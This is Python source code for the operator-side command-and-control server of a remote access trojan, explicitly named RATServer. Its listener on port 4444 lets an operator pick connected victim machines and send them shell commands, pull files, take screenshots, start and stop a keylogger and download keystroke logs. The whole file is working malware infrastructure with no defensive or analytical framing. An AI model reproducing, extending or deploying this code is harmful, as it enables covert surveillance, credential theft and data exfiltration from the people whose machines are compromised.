import socket
import threading
import ssl
import json
import struct
import os
import logging
import time
from queue import Queue
from pathlib import Path

# Enhanced logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)

class RATServer:
    def __init__(self, host='0.0.0.0', port=4444, use_ssl=False, certfile=None, keyfile=None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.certfile = certfile
        self.keyfile = keyfile
        self.server_socket = None
        self.clients = {}  # Track clients by address: {'ip:port': {'socket': sock, 'thread': thread}}
        self.command_queue = Queue()
        self.running = False
        
        # Create downloads directory if not exists
        self.downloads_dir = Path('downloads')
        self.downloads_dir.mkdir(exist_ok=True)

    def start(self):
        """Start the server and listen for connections"""
        self.running = True
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            logging.info(f"Server listening on {self.host}:{self.port} (SSL: {self.use_ssl})")

            # Setup SSL if enabled
            if self.use_ssl:
                if not self.certfile or not self.keyfile:
                    raise ValueError("SSL enabled but certfile or keyfile not provided")
                self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                self.context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
            else:
                self.context = None

            # Start command handler thread
            threading.Thread(target=self._command_handler, daemon=True).start()

            # Main accept loop
            while self.running:
                try:
                    client_sock, addr = self.server_socket.accept()
                    client_id = f"{addr[0]}:{addr[1]}"
                    
                    if self.context:
                        try:
                            client_sock = self.context.wrap_socket(client_sock, server_side=True)
                            logging.info(f"SSL connection established with {client_id}")
                        except ssl.SSLError as e:
                            logging.error(f"SSL handshake failed with {client_id}: {e}")
                            client_sock.close()
                            continue
                    
                    # Create and track new client thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_sock, addr),
                        daemon=True
                    )
                    
                    self.clients[client_id] = {
                        'socket': client_sock,
                        'thread': client_thread,
                        'last_active': time.time()
                    }
                    
                    client_thread.start()
                    logging.info(f"New connection from {client_id}. Active clients: {len(self.clients)}")
                    
                except OSError as e:
                    if self.running:
                        logging.error(f"Accept error: {e}")
                    continue
                
        except Exception as e:
            logging.error(f"Server error: {e}")
        finally:
            self.stop()

    def stop(self):
        """Cleanly shutdown the server"""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception as e:
                logging.error(f"Error closing server socket: {e}")
        
        # Close all client connections
        for client_id, client_data in list(self.clients.items()):
            try:
                client_data['socket'].close()
                if client_data['thread'].is_alive():
                    client_data['thread'].join(timeout=1)
            except Exception as e:
                logging.error(f"Error closing client {client_id}: {e}")
            finally:
                self.clients.pop(client_id, None)
        
        logging.info("Server shutdown complete")

    def _command_handler(self):
        """Handle commands from the console input"""
        while self.running:
            try:
                if not self.clients:
                    time.sleep(1)
                    continue
                
                # Show active clients
                print("\nActive clients:")
                for i, client_id in enumerate(self.clients.keys(), 1):
                    print(f"{i}. {client_id}")
                
                # Get client selection
                try:
                    selection = input("\nSelect client (number) or 'exit' to quit: ").strip()
                    if selection.lower() == 'exit':
                        self.stop()
                        return
                    
                    client_id = list(self.clients.keys())[int(selection)-1]
                except (ValueError, IndexError):
                    print("Invalid selection")
                    continue
                
                # Command loop for selected client
                while True:
                    command = input(f"\nCommand for {client_id} (or 'back'): ").strip()
                    if not command:
                        continue
                    if command.lower() == 'back':
                        break
                    
                    # Queue the command for the client handler
                    self.command_queue.put((client_id, command))
                    
            except Exception as e:
                logging.error(f"Command handler error: {e}")

    def handle_client(self, client_sock, addr):
        """Handle communication with a single client"""
        client_id = f"{addr[0]}:{addr[1]}"
        
        try:
            while self.running:
                # Check for commands in the queue for this client
                if not self.command_queue.empty():
                    queued_client_id, command = self.command_queue.queue[0]
                    if queued_client_id == client_id:
                        self.command_queue.get()  # Remove from queue
                        
                        # Process the command
                        if command.lower() == 'exit':
                            self.send_json(client_sock, {'command': 'exit'})
                            break
                        
                        # Parse command
                        cmd_parts = command.split(' ', 1)
                        cmd_name = cmd_parts[0].lower()
                        cmd_args = cmd_parts[1] if len(cmd_parts) > 1 else ''
                        
                        # Special commands
                        if cmd_name == 'download':
                            if os.path.isfile(cmd_args):
                                self.send_json(client_sock, {'command': 'download', 'args': cmd_args})
                                response = self.recv_json(client_sock)
                                if response and response.get('status') == 'ready':
                                    if not self.receive_file(client_sock, self.downloads_dir / Path(cmd_args).name):
                                        logging.error("File download failed")
                            else:
                                logging.error(f"File not found: {cmd_args}")
                            continue
                            
                        elif cmd_name == 'upload':
                            self.send_json(client_sock, {'command': 'upload', 'args': cmd_args})
                            response = self.recv_json(client_sock)
                            if response and response.get('status') == 'ready':
                                if not self.send_file(client_sock, cmd_args):
                                    self.send_json(client_sock, {'status': 'error', 'message': 'Upload failed'})
                                else:
                                    self.send_json(client_sock, {'status': 'success'})
                            continue
                            
                        elif cmd_name == 'screenshot':
                            self.send_json(client_sock, {'command': 'screenshot'})
                            response = self.recv_json(client_sock)
                            if response and response.get('status') == 'ready':
                                screenshot_path = self.downloads_dir / f"screenshot_{client_id.replace(':', '_')}_{int(time.time())}.png"
                                if not self.receive_file(client_sock, screenshot_path):
                                    logging.error("Failed to receive screenshot")
                            continue
                            
                        elif cmd_name in ['start_keylogger', 'stop_keylogger']:
                            self.send_json(client_sock, {'command': cmd_name})
                            response = self.recv_json(client_sock)
                            if response:
                                print(f"Client: {response.get('message', response)}")
                            continue
                            
                        elif cmd_name == 'get_keylogs':
                            self.send_json(client_sock, {'command': 'get_keylogs'})
                            response = self.recv_json(client_sock)
                            if response and response.get('status') == 'ready':
                                log_path = self.downloads_dir / f"keylogs_{client_id.replace(':', '_')}_{int(time.time())}.txt"
                                if not self.receive_file(client_sock, log_path):
                                    logging.error("Failed to receive keylogs")
                            continue
                            
                        # Regular command execution
                        else:
                            self.send_json(client_sock, {'command': 'exec', 'raw': command})
                            response = self.recv_json(client_sock)
                            if response:
                                if response.get('status') == 'success':
                                    print(f"\nClient output:\n{response.get('output')}")
                                else:
                                    print(f"\nClient error: {response.get('message')}")
                            continue
                
                # Small sleep to prevent busy waiting
                time.sleep(0.1)
                
        except (ConnectionError, OSError) as e:
            logging.error(f"Client {client_id} connection error: {e}")
        except Exception as e:
            logging.error(f"Client {client_id} handler error: {e}")
        finally:
            client_sock.close()
            self.clients.pop(client_id, None)
            logging.info(f"Client {client_id} disconnected. Remaining clients: {len(self.clients)}")

    def send_json(self, sock, data):
        """Send JSON data to client with length prefix"""
        try:
            message = json.dumps(data).encode()
            length = struct.pack('>I', len(message))
            sock.sendall(length + message)
            return True
        except Exception as e:
            logging.error(f"Failed to send JSON data: {e}")
            return False

    def recv_json(self, sock):
        """Receive JSON data from client with length prefix"""
        try:
            raw_length = self.recvall(sock, 4)
            if not raw_length:
                return None
            length = struct.unpack('>I', raw_length)[0]
            data = self.recvall(sock, length)
            return json.loads(data.decode()) if data else None
        except Exception as e:
            logging.error(f"Failed to receive JSON data: {e}")
            return None

    def recvall(self, sock, n):
        """Receive exactly n bytes from socket"""
        data = b''
        while len(data) < n and self.running:
            try:
                packet = sock.recv(n - len(data))
                if not packet:
                    return None
                data += packet
            except socket.timeout:
                continue
            except (ConnectionError, OSError):
                return None
        return data

    def send_file(self, sock, filepath):
        """Send file to client"""
        try:
            with open(filepath, 'rb') as f:
                while self.running:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    sock.sendall(chunk)
            sock.sendall(b"EOFEOFEOFEOF")
            logging.info(f"File sent: {filepath}")
            return True
        except Exception as e:
            logging.error(f"File send error: {e}")
            return False

    def receive_file(self, sock, filepath):
        """Receive file from client"""
        try:
            with open(filepath, 'wb') as f:
                while self.running:
                    data = sock.recv(4096)
                    if not data:
                        return False
                    if data.endswith(b"EOFEOFEOFEOF"):
                        f.write(data[:-12])
                        break
                    f.write(data)
            logging.info(f"File received: {filepath}")
            return True
        except Exception as e:
            logging.error(f"File receive error: {e}")
            return False

if __name__ == "__main__":
    # SSL configuration - modify paths as needed
    ssl_enabled = False
    certfile = 'server.crt'
    keyfile = 'server.key'
    
    if ssl_enabled and (not os.path.exists(certfile) or not os.path.exists(keyfile)):
        logging.error("SSL certificates not found. Disabling SSL.")
        ssl_enabled = False
    
    server = RATServer(
        host='0.0.0.0',
        port=4444,
        use_ssl=ssl_enabled,
        certfile=certfile if ssl_enabled else None,
        keyfile=keyfile if ssl_enabled else None
    )
    
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()